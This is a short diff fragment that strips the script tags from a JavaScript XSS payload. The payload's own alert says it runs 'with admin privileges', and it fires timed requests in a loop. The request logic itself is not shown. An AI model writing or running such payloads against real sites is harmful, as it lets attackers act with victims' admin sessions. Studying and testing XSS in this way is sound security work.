@@ -1,4 +1,3 @@
-<script type = "text/javascript">
 window.onload = function() {
     // First verify script execution with an alert
     alert("XSS script is running with admin privileges");
@@ -57,5 +56,3 @@ window.onload = function() {
         }, i * 200);  // 200ms delay between requests to avoid overwhelming server
     }
 };
-
-</script>
